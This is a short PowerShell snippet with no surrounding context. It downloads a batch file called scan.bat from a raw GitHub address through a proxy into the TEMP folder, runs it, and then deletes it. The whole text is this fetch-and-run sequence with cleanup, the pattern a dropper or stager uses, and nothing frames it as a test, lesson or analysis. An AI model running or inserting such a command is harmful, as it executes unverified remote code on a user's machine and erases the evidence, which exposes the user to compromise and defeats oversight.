Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan.bat" -Proxy $prx -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat
